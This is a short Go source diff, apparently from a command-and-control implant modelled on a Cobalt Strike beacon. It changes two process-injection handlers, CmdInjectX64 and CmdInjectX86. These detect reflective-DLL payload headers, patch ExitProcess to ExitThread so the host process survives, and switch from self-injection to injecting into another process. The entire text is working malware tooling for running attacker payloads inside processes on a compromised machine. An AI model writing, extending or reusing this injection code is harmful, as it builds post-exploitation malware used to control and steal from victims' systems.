@@ -318,7 +318,7 @@ func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
 	hx64, _ := hex.DecodeString("4d5a41525548")
 	if bytes.Contains(cmdBuf, rx64) && !bytes.HasPrefix(cmdBuf[8:], hx64) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
-		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
+		return packet.DllInjectProcess([]byte("\x00"), cmdBuf)
 	}
 	return packet.InjectProcessRemote(cmdBuf)
 }
@@ -328,7 +328,7 @@ func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
 	hx86, _ := hex.DecodeString("4d5a5245")
 	if bytes.Contains(cmdBuf, rx86) && !bytes.HasPrefix(cmdBuf[8:], hx86) {
 		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
-		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
+		return packet.DllInjectProcess([]byte("\x00"), cmdBuf)
 	}
 	return packet.InjectProcessRemote(cmdBuf)
 }
